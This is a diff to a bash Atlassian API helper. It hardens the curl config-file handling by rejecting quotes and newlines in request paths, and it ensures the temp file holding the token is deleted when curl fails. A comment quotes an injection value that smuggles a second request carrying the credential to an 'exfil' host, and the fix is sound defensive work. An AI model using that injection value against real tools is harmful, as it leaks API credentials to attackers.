@@ -61,7 +61,29 @@ require_config() {
 # runs in a subshell, so API_STATUS would never reach the caller.
 api() {
     local method="$1" path="$2" body="${3:-}"
-    local cfg out
+    local cfg out curl_status
+
+    # PATH is built from caller-supplied values (an issue key, a page id, a
+    # CQL query) and lands verbatim inside a curl -K config file as
+    # `url = "SITE+PATH"`. A double quote or a newline in it breaks out of
+    # that quoted value and starts a new curl directive on the next line -
+    # e.g. a following `url = "..."` line for a second, attacker-chosen
+    # request, which still inherits the `user = "email:token"` line already
+    # in the same file. Proven live with strace: a page id of
+    # $'123"\nurl = "http://host/exfil' produced two transfers from one
+    # call, the second carrying the credential to the attacker's host.
+    # Rejecting both characters here protects every caller of api() - not
+    # just confluence-pages.sh, but jira-meta.sh and jira-issues.sh too,
+    # which also splice user-supplied values (issue keys, project keys)
+    # into PATH.
+    case "$path" in
+        *'"'*|*$'\n'*)
+            echo "Error: refusing to build a request for this path." >&2
+            echo "Cause: it contains a double quote or a newline, which can break out of the curl config file and inject a second, attacker-chosen request." >&2
+            echo "Fix: check the id or query value passed in - it should not contain those characters." >&2
+            exit 1
+            ;;
+    esac
 
     cfg=$(mktemp) || { echo "Error: cannot create a temp file for the curl config." >&2; exit 1; }
     chmod 600 "$cfg"
@@ -79,12 +101,28 @@ api() {
         fi
     } > "$cfg"
 
+    # errexit is turned off around the curl call itself so a connection, DNS,
+    # TLS or proxy failure does not abort the function before the temp file
+    # below is removed. A config file naming the token in plain text (as
+    # `user = "email:TOKEN"`) surviving in /tmp after any such failure is
+    # itself a credential leak - proven live: the reviewer reproduced one and
+    # read it back.
+    set +e
     if [ -n "$body" ]; then
         out=$(printf '%s' "$body" | curl -K "$cfg")
     else
         out=$(curl -K "$cfg" < /dev/null)
     fi
+    curl_status=$?
+    set -e
     rm -f "$cfg"
+
+    if [ "$curl_status" -ne 0 ]; then
+        echo "Error: the request to the Atlassian API failed (curl exit $curl_status)." >&2
+        echo "Cause: a network, DNS, TLS or proxy failure - see curl's own message above, if any." >&2
+        echo "Fix: check connectivity and try again." >&2
+        exit 1
+    fi
 
     # write-out appended "\n<status>". $'\n' is literal inside a quoted
     # expansion, so the newline goes through a variable.
